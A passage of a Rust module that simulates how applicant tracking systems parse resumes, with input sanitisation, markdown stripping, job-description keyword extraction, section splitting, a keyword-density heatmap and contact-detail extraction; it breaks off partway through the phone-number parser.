//! ATS parse simulation, keyword-density heatmap, and JD metadata extraction.
//!
//! Faithful Rust port of `apps/desktop/src/lib/resume-synthesis/ats-simulate.ts`
//! (which is itself a hardened native port of IgniteCV's `atsService`,
//! `keywordAnalysisService`, and `metadataExtractor`). The TypeScript module is
//! the canonical owner; this twin exists so the headless MCP server answers
//! identically — same rules table, same alias tables, same thresholds, same
//! warning strings.
//!
//! Constants that must not drift from the TS side:
//! * `ATS_MAX_INPUT_CHARS = 400_000`, `ATS_MAX_LINES = 20_000`
//! * keyword limit default 30 (cap 100), importance tiers at rank 10 / 20
//! * density heat bands: 0 · <1 · <2 · <3.5 (ideal) · <5 · ≥5 (%)
//! * overused threshold: >10 occurrences
//! * boundary edge classes: left `[^a-z0-9+#&]`, right `[^a-z0-9+&]`
//!   ('.' is a valid right edge, '&' is never an edge)
//!
//! Deliberate divergences from IgniteCV upstream (all fixed on the TS side
//! first, mirrored here): dynamic-regex injection replaced by a linear
//! boundary scanner, Unicode letters preserved by plain-text coercion,
//! exact-match header aliasing shared by splitter and simulator, bounded
//! inputs everywhere, inverted salary ranges rejected, requirement buckets
//! tracked per line instead of per blank-line-separated paragraph.

use std::collections::HashMap;
use std::sync::OnceLock;

use serde::Serialize;
use unicode_normalization::UnicodeNormalization;

/// Hard cap for any text entering this module (chars). Fail closed.
pub const ATS_MAX_INPUT_CHARS: usize = 400_000;
/// Hard cap on retained lines after clamping.
pub const ATS_MAX_LINES: usize = 20_000;
const MAX_KEYWORD_CHARS: usize = 100;

/// Normalize NFC, drop control/bidi/zero-width characters, normalize newlines,
/// and clamp size. Mirrors `clampAtsInput`.
pub fn clamp_ats_input(input: &str) -> String {
    if input.is_empty() {
        return String::new();
    }
    let mut out = String::with_capacity(input.len());
    let mut kept_chars = 0usize;
    for ch in input.nfc() {
        if kept_chars >= ATS_MAX_INPUT_CHARS {
            break;
        }
        let code = ch as u32;
        let keep = code == 0x0a
            || code == 0x09
            || code == 0x0d
            || (code >= 0x20
                && code != 0x7f
                && !(0x200b..=0x200f).contains(&code)
                && !(0x202a..=0x202e).contains(&code)
                && !(0x2066..=0x2069).contains(&code));
        if keep {
            out.push(ch);
            kept_chars += 1;
        }
    }
    // Normalize CR/LF variants.
    let mut normalized = String::with_capacity(out.len());
    let mut chars = out.chars().peekable();
    while let Some(ch) = chars.next() {
        if ch == '\r' {
            if chars.peek() == Some(&'\n') {
                chars.next();
            }
            normalized.push('\n');
        } else {
            normalized.push(ch);
        }
    }
    let mut lines: Vec<&str> = normalized.split('\n').collect();
    if lines.len() > ATS_MAX_LINES {
        lines.truncate(ATS_MAX_LINES);
        normalized = lines.join("\n");
    }
    let total: usize = normalized.chars().count();
    if total > ATS_MAX_INPUT_CHARS {
        normalized.chars().take(ATS_MAX_INPUT_CHARS).collect()
    } else {
        normalized
    }
}

// ---------------------------------------------------------------------------
// ATS system rules
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum AtsSystemId {
    Taleo,
    Workday,
    Greenhouse,
    Lever,
    Jobvite,
    Icims,
    Generic,
}

impl AtsSystemId {
    pub fn as_str(&self) -> &'static str {
        match self {
            AtsSystemId::Taleo => "taleo",
            AtsSystemId::Workday => "workday",
            AtsSystemId::Greenhouse => "greenhouse",
            AtsSystemId::Lever => "lever",
            AtsSystemId::Jobvite => "jobvite",
            AtsSystemId::Icims => "icims",
            AtsSystemId::Generic => "generic",
        }
    }

    /// Parse a wire/system id; unknown ids fall back to `Generic`.
    pub fn parse(value: &str) -> Option<AtsSystemId> {
        match value.to_ascii_lowercase().as_str() {
            "taleo" => Some(AtsSystemId::Taleo),
            "workday" => Some(AtsSystemId::Workday),
            "greenhouse" => Some(AtsSystemId::Greenhouse),
            "lever" => Some(AtsSystemId::Lever),
            "jobvite" => Some(AtsSystemId::Jobvite),
            "icims" => Some(AtsSystemId::Icims),
            "generic" => Some(AtsSystemId::Generic),
            _ => None,
        }
    }

    /// Fixed priority order so callers can rely on `detect(...)[0]`.
    pub const ALL: &'static [AtsSystemId] = &[
        AtsSystemId::Taleo,
        AtsSystemId::Workday,
        AtsSystemId::Greenhouse,
        AtsSystemId::Lever,
        AtsSystemId::Jobvite,
        AtsSystemId::Icims,
    ];
}

pub struct AtsFormattingRules {
    pub remove_formatting: bool,
    pub plain_text_only: bool,
    pub keyword_density_target: f64,
    pub section_order: &'static [&'static str],
    pub required_sections: &'static [&'static str],
}

pub fn ats_rules_for(system: AtsSystemId) -> AtsFormattingRules {
    match system {
        AtsSystemId::Taleo => AtsFormattingRules {
            remove_formatting: true,
            plain_text_only: true,
            keyword_density_target: 0.02,
            section_order: &["summary", "experience", "education", "skills"],
            required_sections: &["experience"],
        },
        AtsSystemId::Workday | AtsSystemId::Icims => AtsFormattingRules {
            remove_formatting: true,
            plain_text_only: true,
            keyword_density_target: if system == AtsSystemId::Workday {
                0.025
            } else {
                0.03
            },
            section_order: &[
                "summary",
                "experience",
                "education",
                "skills",
                "certifications",
            ],
            required_sections: &["experience", "education"],
        },
        AtsSystemId::Greenhouse => AtsFormattingRules {
            remove_formatting: false,
            plain_text_only: false,
            keyword_density_target: 0.03,
            section_order: &["summary", "experience", "education", "skills"],
            required_sections: &["experience"],
        },
        AtsSystemId::Lever => AtsFormattingRules {
            remove_formatting: false,
            plain_text_only: false,
            keyword_density_target: 0.025,
            section_order: &["summary", "experience", "education", "skills"],
            required_sections: &["experience"],
        },
        AtsSystemId::Jobvite => AtsFormattingRules {
            remove_formatting: true,
            plain_text_only: true,
            keyword_density_target: 0.02,
            section_order: &["summary", "experience", "education", "skills"],
            required_sections: &["experience"],
        },
        AtsSystemId::Generic => AtsFormattingRules {
            remove_formatting: true,
            plain_text_only: true,
            keyword_density_target: 0.025,
            section_order: &["summary", "experience", "education", "skills"],
            required_sections: &["experience"],
        },
    }
}

/// Detect vendor mentions in a JD; falls back to `[Generic]`. Mirrors
/// `detectAtsSystems` including the Oracle→Taleo hint.
pub fn detect_ats_systems(jd_text: &str) -> Vec<AtsSystemId> {
    let lower = clamp_ats_input(jd_text).to_lowercase();
    if lower.is_empty() {
        return vec![AtsSystemId::Generic];
    }
    let mut detected: Vec<AtsSystemId> = AtsSystemId::ALL
        .iter()
        .copied()
        .filter(|system| lower.contains(system.as_str()))
        .collect();
    if lower.contains("oracle") && !detected.contains(&AtsSystemId::Taleo) {
        detected.insert(0, AtsSystemId::Taleo);
    }
    if detected.is_empty() {
        vec![AtsSystemId::Generic]
    } else {
        detected
    }
}

// ---------------------------------------------------------------------------
// Markdown stripping / plain-text coercion (regex-free, total)
// ---------------------------------------------------------------------------

fn strip_bold_markers(text: &str) -> String {
    // **interior** → interior; interior excludes '*' (mirrors `\*\*([^*]+)\*\*`).
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(start) = rest.find("**") {
        let after_opener = &rest[start + 2..];
        match after_opener.find("**") {
            Some(rel_close) if rel_close > 0 => {
                let interior = &after_opener[..rel_close];
                if !interior.contains('*') {
                    out.push_str(&rest[..start]);
                    out.push_str(interior);
                    rest = &after_opener[rel_close + 2..];
                } else {
                    // Interior holds a lone '*': the opener is literal text.
                    out.push_str(&rest[..start + 1]);
                    rest = &rest[start + 1..];
                }
            }
            _ => {
                // No valid closer: emit the marker pair literally and move on.
                out.push_str(&rest[..start + 2]);
                rest = &rest[start + 2..];
            }
        }
    }
    out.push_str(rest);
    out
}

fn strip_single_char_pairs(text: &str, marker: char, require_interior: bool) -> String {
    // marker…marker pairs on one line: interior excludes marker and '\n'.
    // For '*' the TS pattern also requires the char before the opener to not
    // be another '*' (`(^|[^*])\*`).
    let chars: Vec<char> = text.chars().collect();
    let mut out = String::with_capacity(text.len());
    let mut i = 0usize;
    while i < chars.len() {
        if chars[i] == marker && !(marker == '*' && i > 0 && chars[i - 1] == '*') {
            let mut j = i + 1;
            while j < chars.len() && chars[j] != marker && chars[j] != '\n' {
                j += 1;
            }
            if j < chars.len() && chars[j] == marker && (!require_interior || j > i + 1) {
                for ch in &chars[i + 1..j] {
                    out.push(*ch);
                }
                i = j + 1;
                continue;
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

fn strip_links(text: &str) -> String {
    // [label](target) → label. Malformed sequences pass through untouched.
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    'outer: while let Some(open_rel) = rest.find('[') {
        let after_open = &rest[open_rel + 1..];
        let close_bracket = match after_open.find(']') {
            Some(rel) if !after_open[..rel].contains('\n') => rel,
            _ => break 'outer,
        };
        let target_part = &after_open[close_bracket + 1..];
        if !target_part.starts_with('(') {
            out.push_str(&rest[..open_rel + 1]);
            rest = &rest[open_rel + 1..];
            continue;
        }
        match target_part[1..].find(')') {
            Some(close_paren) if !target_part[1..1 + close_paren].contains('\n') => {
                out.push_str(&rest[..open_rel]);
                out.push_str(&after_open[..close_bracket]);
                let consumed = 1 + close_bracket + 1 + 1 + close_paren + 1;
                rest = &rest[open_rel + consumed..];
            }
            _ => {
                out.push_str(&rest[..open_rel + 1]);
                rest = &rest[open_rel + 1..];
            }
        }
    }
    out.push_str(rest);
    out
}

fn strip_heading_prefixes(text: &str) -> String {
    // TS: `^#{1,6}[ \t]+` per line — hashes must start at column 0.
    text.split_inclusive('\n')
        .map(|line| {
            let hashes = line.chars().take_while(|c| *c == '#').count();
            if (1..=6).contains(&hashes)
                && line.chars().nth(hashes).is_some_and(|c| c == ' ' || c == '\t')
            {
                line[hashes..].trim_start_matches([' ', '\t'])
            } else {
                line
            }
        })
        .collect()
}

fn collapse_blank_runs(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut newline_run = 0usize;
    for ch in text.chars() {
        if ch == '\n' {
            newline_run += 1;
            if newline_run <= 2 {
                out.push(ch);
            }
        } else {
            newline_run = 0;
            out.push(ch);
        }
    }
    out
}

/// Strip common markdown decoration while preserving Unicode text content.
pub fn strip_markdown_formatting(content: &str) -> String {
    let clamped = clamp_ats_input(content);
    let step = strip_bold_markers(&clamped);
    let step = strip_single_char_pairs(&step, '*', true);
    let step = strip_single_char_pairs(&step, '_', true);
    let step = strip_single_char_pairs(&step, '`', false);
    let step = strip_links(&step);
    let step = strip_heading_prefixes(&step);
    collapse_blank_runs(&step)
}

/// Chars preserved by strict plain-text coercion (mirrors the TS set exactly,
/// including the accidental-but-harmless backslash).
const PLAIN_ALLOWED_PUNCT: &[char] = &[
    '.', ',', ';', ':', '!', '?', '(', ')', '\\', '-', '\'', '"', '&', '/',
    '+', '#', '@', '_', '=', ' ',
];

fn is_plain_allowed(ch: char) -> bool {
    ch.is_whitespace()
        || ch.is_alphabetic()
        || ch.is_numeric()
        || PLAIN_ALLOWED_PUNCT.contains(&ch)
}

fn coerce_to_plain_text(text: &str) -> String {
    let lines: Vec<String> = text
        .split('\n')
        .map(|line| {
            let filtered: String = line
                .chars()
                .map(|ch| if is_plain_allowed(ch) { ch } else { ' ' })
                .collect();
            // Collapse horizontal whitespace runs to a single space; keep
            // line breaks intact (upstream collapsed them away entirely).
            let mut out = String::with_capacity(filtered.len());
            let mut in_space = false;
            for ch in filtered.chars() {
                if ch != '\n' && ch.is_whitespace() {
                    if !in_space {
                        out.push(' ');
                        in_space = true;
                    }
                } else {
                    in_space = false;
                    out.push(ch);
                }
            }
            out.trim().to_string()
        })
        .collect();
    collapse_blank_runs(&lines.join("\n"))
}

/// Format content the way `system` would ingest it.
pub fn format_for_ats(content: &str, system: AtsSystemId) -> String {
    let rules = ats_rules_for(system);
    let formatted = clamp_ats_input(content);
    if rules.remove_formatting && rules.plain_text_only {
        coerce_to_plain_text(&strip_markdown_formatting(&formatted))
    } else if rules.remove_formatting {
        strip_markdown_formatting(&formatted)
    } else {
        formatted
    }
}

/// Cheap preview of what the ATS "sees".
pub fn get_ats_parse_preview(content: &str, system: AtsSystemId) -> String {
    format_for_ats(content, system)
}

// ---------------------------------------------------------------------------
// Boundary-aware occurrence counting
// ---------------------------------------------------------------------------

fn is_left_non_edge(ch: char) -> bool {
    matches!(ch, 'a'..='z' | '0'..='9' | '+' | '#' | '&')
}

fn is_right_non_edge(ch: char) -> bool {
    matches!(ch, 'a'..='z' | '0'..='9' | '+' | '&')
}

/// Count case-insensitive boundary-delimited occurrences of `needle` in
/// `haystack`. Linear; metacharacters are inert. Edge classes match
/// `career_match::text::contains_at_boundary` and the TS scorer.
pub fn count_boundary_hits(haystack: &str, needle: &str) -> usize {
    let hay = haystack.to_lowercase();
    let ned = needle.trim().to_lowercase();
    if hay.is_empty() || ned.is_empty() || ned.chars().count() > MAX_KEYWORD_CHARS {
        return 0;
    }
    let hay_chars: Vec<char> = hay.chars().collect();
    let ned_chars: Vec<char> = ned.chars().collect();
    if ned_chars.len() > hay_chars.len() {
        return 0;
    }
    let first = ned_chars[0];
    let mut count = 0usize;
    for start in 0..=(hay_chars.len() - ned_chars.len()) {
        if hay_chars[start] != first {
            continue;
        }
        if hay_chars[start..start + ned_chars.len()] == ned_chars[..] {
            let left_ok = start == 0 || !is_left_non_edge(hay_chars[start - 1]);
            let end = start + ned_chars.len();
            let right_ok = end >= hay_chars.len() || !is_right_non_edge(hay_chars[end]);
            if left_ok && right_ok {
                count += 1;
            }
        }
    }
    count
}

// ---------------------------------------------------------------------------
// JD keyword extraction
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum KeywordImportance {
    High,
    Medium,
    Low,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct JdKeywordHit {
    pub word: String,
    pub count: usize,
    pub importance: KeywordImportance,
}

/// Union of both upstream stopword lists plus grammatical filler; must match
/// the TS `KEYWORD_STOPWORDS` set.
pub const KEYWORD_STOPWORDS: &[&str] = &[
    "the", "a", "an", "and", "or", "but", "in", "on", "at", "to", "for", "of",
    "with", "by", "from", "as", "is", "was", "are", "were", "been", "be",
    "have", "has", "had", "will", "shall", "should", "can", "could", "may",
    "might", "must", "this", "that", "these", "those", "your", "you", "our",
    "their", "they", "also", "using", "used", "use", "who", "what", "when",
    "where", "while", "than", "then", "them", "its", "it's", "into", "over",
    "under", "about", "across", "along", "among", "any", "all", "each", "both",
];

fn stopwords() -> &'static std::collections::HashSet<&'static str> {
    static SET: OnceLock<std::collections::HashSet<&'static str>> = OnceLock::new();
    SET.get_or_init(|| KEYWORD_STOPWORDS.iter().copied().collect())
}

fn tokenize_words(text: &str) -> Vec<String> {
    text.to_lowercase()
        .split(|ch: char| !(ch.is_alphanumeric() || ch == '-'))
        .map(|token| token.trim_matches('-').to_string())
        .filter(|token| !token.is_empty())
        .collect()
}

/// Frequency-ranked JD keywords; rank <10 high, <20 medium, else low.
/// Ties break alphabetically for cross-engine determinism.
pub fn extract_jd_keywords(jd_text: &str, limit: Option<usize>) -> Vec<JdKeywordHit> {
    let limit = limit.unwrap_or(30).clamp(1, 100);
    let mut freq: HashMap<String, usize> = HashMap::new();
    for token in tokenize_words(&clamp_ats_input(jd_text)) {
        if token.chars().count() <= 3 || stopwords().contains(token.as_str()) {
            continue;
        }
        *freq.entry(token).or_insert(0) += 1;
    }
    let mut sorted: Vec<(String, usize)> = freq.into_iter().collect();
    sorted.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
    sorted
        .into_iter()
        .enumerate()
        .take(limit)
        .map(|(index, (word, count))| JdKeywordHit {
            word,
            count,
            importance: if index < 10 {
                KeywordImportance::High
            } else if index < 20 {
                KeywordImportance::Medium
            } else {
                KeywordImportance::Low
            },
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Resume section model — one alias table drives splitting AND simulation
// ---------------------------------------------------------------------------

struct SectionDef {
    canonical: &'static str,
    display: &'static str,
    matchers: &'static [&'static str],
}

const PREAMBLE_DISPLAY: &str = "Introduction";

const SECTION_DEFS: &[SectionDef] = &[
    SectionDef {
        canonical: "summary",
        display: "Summary",
        matchers: &[
            "summary",
            "professional summary",
            "summary of qualifications",
            "objective",
            "career objective",
            "profile",
            "professional profile",
            "about",
            "about me",
        ],
    },
    SectionDef {
        canonical: "experience",
        display: "Experience",
        matchers: &[
            "experience",
            "work experience",
            "professional experience",
            "relevant experience",
            "employment",
            "employment history",
            "work history",
            "career history",
        ],
    },
    SectionDef {
        canonical: "education",
        display: "Education",
        matchers: &[
            "education",
            "academic background",
            "academic history",
            "academics",
            "degrees",
            "education & training",
        ],
    },
    SectionDef {
        canonical: "skills",
        display: "Skills",
        matchers: &[
            "skills",
            "technical skills",
            "core skills",
            "key skills",
            "competencies",
            "core competencies",
            "expertise",
            "areas of expertise",
            "technologies",
            "tech stack",
            "tools",
        ],
    },
    SectionDef {
        canonical: "projects",
        display: "Projects",
        matchers: &["projects", "selected projects", "personal projects", "key projects"],
    },
    SectionDef {
        canonical: "publications",
        display: "Publications",
        matchers: &[
            "publications",
            "selected publications",
            "papers",
            "research",
            "research papers",
            "academic publications",
        ],
    },
    SectionDef {
        canonical: "leadership",
        display: "Leadership",
        matchers: &[
            "leadership",
            "leadership experience",
            "positions of responsibility",
            "activities",
            "extra curricular activities",
            "extracurricular activities",
            "co curricular activities",
        ],
    },
    SectionDef {
        canonical: "certifications",
        display: "Certifications",
        matchers: &[
            "certifications",
            "certificates",
            "licenses",
            "licenses & certifications",
            "licenses and certifications",
            "professional certifications",
        ],
    },
    SectionDef {
        canonical: "awards",
        display: "Awards",
        matchers: &[
            "awards",
            "honors",
            "honours",
            "achievements",
            "accomplishments",
            "honors and awards",
            "honours and awards",
            "awards and honors",
            "awards and honours",
            "honors & awards",
            "awards & honors",
        ],
    },
    SectionDef {
        canonical: "languages",
        display: "Languages",
        matchers: &["languages", "spoken languages"],
    },
    SectionDef {
        canonical: "volunteer",
        display: "Volunteer",
        matchers: &[
            "volunteer",
            "volunteer experience",
            "volunteering",
            "community service",
            "community involvement",
        ],
    },
    SectionDef {
        canonical: "links",
        display: "Links",
        matchers: &["links", "portfolio", "profiles"],
    },
    SectionDef {
        canonical: "contact",
        display: "Contact",
        matchers: &["contact", "contact information", "contact info"],
    },
];

fn fold_header_key(line: &str) -> Option<String> {
    let stripped_controls: String = line
        .nfc()
        .filter(|ch| {
            let c = *ch as u32;
            !matches!(
                c,
                0x00..=0x08
                    | 0x0B
                    | 0x0C
                    | 0x0E..=0x1F
                    | 0x7F
                    | 0x200B..=0x200F
                    | 0x202A..=0x202E
                    | 0x2066..=0x2069
                    | 0xFEFF
            )
        })
        .collect();
    let trimmed = stripped_controls.trim();
    if trimmed.is_empty() {
        return None;
    }
    let stripped = trimmed
        .trim_start_matches(HEADER_LEADING_STRIP)
        .trim_end_matches(HEADER_TRAILING_STRIP);
    let stripped = {
        let chars: Vec<char> = stripped.chars().collect();
        let mut digits = 0usize;
        while digits < 2 && digits < chars.len() && chars[digits].is_ascii_digit() {
            digits += 1;
        }
        if digits > 0
            && digits < chars.len()
            && (chars[digits] == '.' || chars[digits] == ')')
        {
            chars[digits + 1..]
                .iter()
                .collect::<String>()
                .trim_start()
                .to_string()
        } else {
            stripped.to_string()
        }
    };
    let with_and = stripped.replace('&', " and ");
    let with_spaces = with_and.replace(['-', '\u{2013}', '\u{2014}'], " ");
    let folded: String = with_spaces
        .nfkd()
        .filter(|c| unicode_normalization::char::canonical_combining_class(*c) == 0)
        .collect();
    let normalized = folded.split_whitespace().collect::<Vec<_>>().join(" ");
    if normalized.is_empty() || normalized.chars().count() > 48 {
        return None;
    }
    Some(normalized.to_lowercase())
}

fn header_lookup() -> &'static HashMap<String, &'static str> {
    static LOOKUP: OnceLock<HashMap<String, &'static str>> = OnceLock::new();
    LOOKUP.get_or_init(|| {
        let mut map = HashMap::new();
        for def in SECTION_DEFS {
            for matcher in def.matchers {
                if let Some(key) = fold_header_key(matcher) {
                    map.insert(key, def.canonical);
                }
            }
        }
        map
    })
}

const HEADER_LEADING_STRIP: &[char] = &[
    '#', '>', '*', '\u{2022}', '\u{b7}', '-', '\u{2013}', '\u{2014}', '+', '=',
    '_', ' ', '\t',
];
const HEADER_TRAILING_STRIP: &[char] = &[
    ' ', '\t', ':', '#', '*', '=', '_', '~', '-', '\u{2013}', '\u{2014}',
    '+', '=', '\u{2022}', '\u{b7}', '|',
];

/// Classify a line as a section header: exact alias-table match after
/// normalization. Body lines merely containing a header word are not headers.
fn header_canonical(line: &str) -> Option<&'static str> {
    let key = fold_header_key(line)?;
    header_lookup().get(&key).copied()
}

#[derive(Debug, Clone, PartialEq)]
pub struct ResumeSection {
    pub name: String,
    pub text: String,
}

/// Split free-text resumes into sections; pre-header text becomes
/// `Introduction`.
pub fn split_resume_into_sections(text: &str) -> Vec<ResumeSection> {
    let clamped = clamp_ats_input(text);
    if clamped.trim().is_empty() {
        return Vec::new();
    }
    let mut sections: Vec<ResumeSection> = Vec::new();
    let mut current_display = PREAMBLE_DISPLAY.to_string();
    let mut current_lines: Vec<&str> = Vec::new();
    {
        let flush = |display: &str, lines: &mut Vec<&str>, sections: &mut Vec<ResumeSection>| {
            let joined = lines.join("\n");
            if !joined.trim().is_empty() {
                sections.push(ResumeSection {
                    name: display.to_string(),
                    text: joined,
                });
            }
            lines.clear();
        };
        for line in clamped.split('\n') {
            match header_canonical(line) {
                Some(canonical) => {
                    flush(&current_display, &mut current_lines, &mut sections);
                    current_display = SECTION_DEFS
                        .iter()
                        .find(|def| def.canonical == canonical)
                        .map(|def| def.display.to_string())
                        .unwrap_or_else(|| canonical.to_string());
                }
                None => current_lines.push(line),
            }
        }
        flush(&current_display, &mut current_lines, &mut sections);
    }
    sections
}

// ---------------------------------------------------------------------------
// Keyword heatmap
// ---------------------------------------------------------------------------

pub type HeatLevel = u8;

/// Density bands: 0 cold · <1% → 1 · <2% → 2 · <3.5% → 3 (ideal) · <5% → 4 · ≥5% hot.
pub fn heat_level_for_density(density: f64) -> HeatLevel {
    if !(density > 0.0) || !density.is_finite() {
        return 0;
    }
    if density < 1.0 {
        1
    } else if density < 2.0 {
        2
    } else if density < 3.5 {
        3
    } else if density < 5.0 {
        4
    } else {
        5
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct HeatmapSectionKeyword {
    pub word: String,
    pub count: usize,
    pub importance: KeywordImportance,
}

#[derive(Debug, Clone, Serialize)]
pub struct HeatmapSection {
    pub name: String,
    pub keywords: Vec<HeatmapSectionKeyword>,
    pub density: f64,
    pub heat_level: HeatLevel,
}

#[derive(Debug, Clone, Serialize)]
pub struct KeywordHeatmap {
    pub sections: Vec<HeatmapSection>,
    pub overall_density: f64,
    pub missing_critical_keywords: Vec<String>,
    pub overused_keywords: Vec<String>,
}

const OVERUSED_THRESHOLD: usize = 10;

/// Per-section keyword-density heatmap of the resume against the JD.
pub fn generate_keyword_heatmap(resume_text: &str, jd_text: &str) -> KeywordHeatmap {
    let resume_clamped = clamp_ats_input(resume_text);
    let jd_keywords = extract_jd_keywords(jd_text, None);
    let sections = split_resume_into_sections(&resume_clamped);

    let heatmap_sections: Vec<HeatmapSection> = sections
        .iter()
        .map(|section| {
            let section_lower = section.text.to_lowercase();
            let section_words = section.text.split_whitespace().count();
            let keywords: Vec<HeatmapSectionKeyword> = jd_keywords
                .iter()
                .map(|k| HeatmapSectionKeyword {
                    word: k.word.clone(),
                    count: count_boundary_hits(&section_lower, &k.word),
                    importance: k.importance,
                })
                .filter(|k| k.count > 0)
                .collect();
            let total_matches: usize = keywords.iter().map(|k| k.count).sum();
            let density = if section_words > 0 {
                (total_matches as f64 / section_words as f64) * 100.0
            } else {
                0.0
            };
            HeatmapSection {
                name: section.name.clone(),
                keywords,
                density,
                heat_level: heat_level_for_density(density),
            }
        })
        .collect();

    let overall_words = resume_clamped.split_whitespace().count();
    let overall_matches: usize = heatmap_sections
        .iter()
        .map(|section| section.keywords.iter().map(|k| k.count).sum::<usize>())
        .sum();
    let overall_density = if overall_words > 0 {
        (overall_matches as f64 / overall_words as f64) * 100.0
    } else {
        0.0
    };

    let resume_lower = resume_clamped.to_lowercase();
    let missing_critical_keywords: Vec<String> = jd_keywords
        .iter()
        .filter(|k| k.importance == KeywordImportance::High)
        .filter(|k| count_boundary_hits(&resume_lower, &k.word) == 0)
        .map(|k| k.word.clone())
        .collect();

    let overused_keywords: Vec<String> = jd_keywords
        .iter()
        .filter(|k| count_boundary_hits(&resume_lower, &k.word) > OVERUSED_THRESHOLD)
        .map(|k| k.word.clone())
        .collect();

    KeywordHeatmap {
        sections: heatmap_sections,
        overall_density,
        missing_critical_keywords,
        overused_keywords,
    }
}

// ---------------------------------------------------------------------------
// ATS parse simulation
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize)]
pub struct AtsParsedSection {
    pub name: String,
    pub detected: bool,
    pub content_chars: usize,
}

#[derive(Debug, Clone, Serialize)]
pub struct AtsContactInfo {
    pub name: Option<String>,
    pub email: Option<String>,
    pub phone: Option<String>,
    pub links: Vec<String>,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct AtsParseReport {
    pub system: String,
    pub sections: Vec<AtsParsedSection>,
    pub missing_required_sections: Vec<String>,
    pub contact_info: AtsContactInfo,
    pub warnings: Vec<String>,
    pub input_chars: usize,
    pub plain_text_chars: usize,
}

fn is_email_local_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'%' | b'+' | b'-')
}

fn is_email_domain_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'.' || b == b'-'
}

fn extract_email(content: &str) -> Option<String> {
    let bytes = content.as_bytes();
    for (at_index, _) in content.match_indices('@') {
        // Walk left over local-part bytes.
        let mut start = at_index;
        while start > 0 && is_email_local_byte(bytes[start - 1]) {
            start -= 1;
        }
        if start == at_index {
            continue; // empty local part
        }
        // Walk right over domain bytes; must end in '.' + ≥2 letters.
        let mut end = at_index + 1;
        while end < bytes.len() && is_email_domain_byte(bytes[end]) {
            end += 1;
        }
        let domain = &content[at_index + 1..end];
        if let Some(dot) = domain.rfind('.') {
            let tld = &domain[dot + 1..];
            if tld.len() >= 2 && tld.chars().all(|c| c.is_ascii_alphabetic()) {
                let candidate = &content[start..end];
                if candidate.chars().count() <= 320 {
                    return Some(candidate.to_string());
                }
                return None;
            }
        }
    }
    None
}

fn extract_links(content: &str) -> Vec<String> {
    let mut links = Vec::new();
    for marker in ["https://", "http://"] {
        let mut search_from = 0usize;
        while let Some(pos) = content[search_from..].find(marker) {
            let abs = search_from + pos;
            let rest = &content[abs..];
            let end = rest
                .find(char::is_whitespace)
                .unwrap_or(rest.len());
            links.push(rest[..end].to_string());
            if links.len() >= 5 {
                return links;
            }
            search_from = abs + marker.len();
        }
    }
    links
}


/// ASCII-case-insensitive prefix strip (char-boundary safe).
fn tail_strip_prefix_ci<'a>(text: &'a str, prefix: &str) -> Option<&'a str> {
    let mut chars = text.char_indices();
    for expected in prefix.chars() {
        let (_, actual) = chars.next()?;
        if !actual.to_lowercase().eq(expected.to_lowercase()) {
            return None;
        }
    }
    let rest_start = chars.next().map_or(text.len(), |(idx, _)| idx);
    Some(&text[rest_start..])
}

/// Parse an optional phone extension token at the start of `tail`.
/// Returns the digits and how many bytes were consumed.
fn parse_extension(tail: &str) -> (Option<String>, usize) {
    let trimmed_ws = tail.trim_start();
    let ws_len = tail.len() - trimmed_ws.len();
    for prefix in ["ext.", "extension", "ext", "x"] {
        if let Some(rest) = tail_strip_prefix_ci(trimmed_ws, prefix) {
            let digits_part = rest.trim_start();
            let digits: String = digits_part
                .chars()
                .take_while(|c| c.is_ascii_digit())
                .collect();
            if (1..=6).contains(&digits.len()) {
                let consumed =
                    ws_len + prefix.len() + (rest.len() - digits_part.len()) + digits.len();
                return (Some(digits), consumed);
            }
            return (None, 0);
        }
    }
    (None, 0)
}

fn extract_phone_candidate(content: &str, from: usize) -> Option<(String, usize)> {
    // Maximal runs of [+]?digit [digits space ( ) . -]* digit.
    let bytes = content.as_bytes();
    let mut i = from;
    while i < bytes.len() {
        let starts_run = bytes[i].is_ascii_digit()
            || (bytes[i] == b'+' && i + 1 < bytes.len() && bytes[i + 1].is_ascii_digit());
        if starts_run && (i == 0 || !bytes[i - 1].is_ascii_digit()) {
            let mut end = i;
            if bytes[end] == b'+' {
                end += 1;
            }
            let run_start = end;
            while end < bytes.len() {
                let b = bytes[end];
                if b.is_ascii_digit()
                    || b == b' '
                    || b == b'('
                    || b == b')'
                    || b == b'.'
                    || b == b'-'
                {
                    end += 1;
                } else {
                    break;
                }
            }
            // Trim separators; must start AND end on a digit.
            let raw = &content[run_start..end];
            let trimmed = raw.trim_matches([' ', '(', ')', '.', '-']);
            if !trimmed.is_empty()
                && trimmed.chars().last().is_some_and(|c| c.is_ascii_digit())
                && trimmed.chars().next().is_some_and(|c| c.is_ascii_digit())
            {
                let digits: String = trimmed.chars().filter(|c| c.is_ascii_digit()).collect();
                if (10..=15).contains(&digits.len()) {
                    let lead_ok =
                        i == 0 || !(bytes[i - 1].is_ascii_alphanumeric());
                    let tail_index = run_start + raw.len();
                    // Optional extension first: x / ext. / extension + digits.
                    // It must be considered BEFORE the alphanumeric-trail
                    // guard, or "…0100 x1234" would be rejected because of
                    // the leading x of the extension token.
                    let tail = &content[tail_index..];
                    let (extension, _ext_consumed) = parse_extension(tail);
                    let trail_ok = if extension.is_some() {
                        true
                    } else {
                        tail_index >= content.len()
                            || !content[tail_index..]
                                .chars()
                                .next()
                                .is_some_and(|c| c.is_ascii_alphanumeric())
                    };
                    if lead_ok && trail_ok {
                        let core = if bytes[i] == b'+' {
                            format!("+{trimmed}")
                        } else {
                            trimmed.to_string()
                        };
                        let phone = match extension {
                            Some(ext_digits) => format!("{core} x{ext_digits}"),
                            None => core,
                        };
